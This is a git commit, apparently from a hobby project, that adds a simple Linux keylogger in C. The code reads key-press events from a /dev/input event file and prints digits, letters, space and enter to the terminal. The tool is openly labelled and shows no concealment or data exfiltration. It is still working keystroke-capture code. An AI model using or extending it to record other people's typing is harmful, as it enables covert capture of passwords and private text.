f93f1d957f08a446c23c283de603bf5d0e3486e0
Bicente44 <vincent.vw04@gmail.com>
2026-03-04 21:36:41 -0500

    Feat: Implement the keylogger 0-9 & A-Z
    With this key logger since were accessing kernel level files we have to
    use system level open and read from fcntl.h and unistd.h.
    
    Within the loop we start by ignoring everything that is not an input
    even and that isint a key press. Then we check for numbers and for
    characters in a massive switch case statement (allthough could probably
    be done in a loop, would be less lines of code more readable but
    possibly slower? fractionally ofcourse).
    
    I still have the TODOs but this should be a good commit first

--- keylogger_main.c
+++ keylogger_main.c
@@ -1,12 +1,132 @@
+#include <fcntl.h>       /* Kernel level file control operations for open */
+#include <linux/input.h> /* The event codes header file */
 #include <stdio.h>
+#include <unistd.h> /* Kernel level file control operations for read */
 
-// Simple shell of program (I have to commit as this may only work on linux not
-// WSL for the /dev/input file access)
-/* I wnat to be able to input int time as an argument for duration of logging */
+/* TODO:
+ * Make outputfile as an option for the logging
+ * Add a 2nd option for time duration (in seconds)
+ */
 int main(int argc, char *argv[]) {
-
-  while (true) {
+  int fd = 0;
+  if (argc < 2) {
+    printf("Usage (inputfile) [outputfile]\n"
+           "Inputfile is the /dev/input/ event file that is linked to your "
+           "keyboard where you can see in /dev/input/by-id\n"
+           "Outputfile as an option if you want to log your key inputs\n");
+    return -1;
   }
+  printf("Keylogger started\n");
 
-  return 0;
+  fd = open(argv[1], O_RDONLY, 0);
+  if (fd == -1)
+    return -1;
+
+  struct input_event ie;
+  while (1) {
+    read(fd, &ie, sizeof(ie));
+    /* Only read event keys */
+    if (ie.type != EV_KEY)
+      continue;
+    /* Ignore all event values other than press */
+    if (ie.value != 1)
+      continue;
+
+    if (ie.code >= 2 && ie.code <= 10) {
+      printf("%d", ie.code - 1);
+    } else if (ie.code == 11) {
+      printf("0");
+    } else {
+      switch (ie.code) {
+      case KEY_A:
+        printf("a");
+        break;
+      case KEY_B:
+        printf("b");
+        break;
+      case KEY_C:
+        printf("c");
+        break;
+      case KEY_D:
+        printf("d");
+        break;
+      case KEY_E:
+        printf("e");
+        break;
+      case KEY_F:
+        printf("f");
+        break;
+      case KEY_G:
+        printf("g");
+        break;
+      case KEY_H:
+        printf("h");
+        break;
+      case KEY_I:
+        printf("i");
+        break;
+      case KEY_J:
+        printf("j");
+        break;
+      case KEY_K:
+        printf("k");
+        break;
+      case KEY_L:
+        printf("l");
+        break;
+      case KEY_M:
+        printf("m");
+        break;
+      case KEY_N:
+        printf("n");
+        break;
+      case KEY_O:
+        printf("o");
+        break;
+      case KEY_P:
+        printf("p");
+        break;
+      case KEY_Q:
+        printf("q");
+        break;
+      case KEY_R:
+        printf("r");
+        break;
+      case KEY_S:
+        printf("s");
+        break;
+      case KEY_T:
+        printf("t");
+        break;
+      case KEY_U:
+        printf("u");
+        break;
+      case KEY_V:
+        printf("v");
+        break;
+      case KEY_W:
+        printf("w");
+        break;
+      case KEY_X:
+        printf("x");
+        break;
+      case KEY_Y:
+        printf("y");
+        break;
+      case KEY_Z:
+        printf("z");
+        break;
+      case KEY_SPACE:
+        printf(" ");
+        break;
+      case KEY_ENTER:
+        printf("\n");
+        break;
+      default:
+        printf("'%d'", ie.code);
+        break;
+      }
+    }
+    fflush(stdout);
+  }
 }
